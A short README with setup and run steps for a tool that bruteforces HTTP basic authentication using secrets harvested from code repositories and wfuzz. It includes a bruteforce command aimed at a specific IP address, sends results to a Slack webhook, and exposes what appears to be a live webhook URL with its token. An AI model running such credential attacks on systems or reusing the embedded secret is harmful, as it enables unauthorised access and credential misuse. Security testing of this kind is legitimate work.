# Basic Authentication Bruteforcing of WFUZZ endpoints with secrets obtained from Repo-Supervisor

1. `cd` into the `wfuzz-basicauth-bruteforcer` directory.

2. Complete the `.env.sample` file in the `wfuzz-basicauth-bruteforcer` directory with the appropriate values and copy it to `.env`.

3. For MacOS, activate the virtual environment and install `pycurl`:
    * `virtualenv env`
    * `. env/bin/activate`
    * `pip install pycurl`

4. For Linux, activate the virtual environment and install `pycurl`:
    * `virtualenv env`
    * `. env/bin/activate`
    * `sudo apt-get install -y build-essential libssl-dev libffi-dev python-dev libcurl4-openssl-dev`
    * `pip install pycurl`

5. Now, in order to bruteforce the basic authentication mechanism with the data retrieved from `wfuzz` and `git-all-secrets`, type `go run bruteforce.go -target 104.198.4.57 -slackHook https://hooks.slack.com/services/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`.

6. Come out of the virtual environment by typing `deactivate`.

7. We should get back some results in Slack.
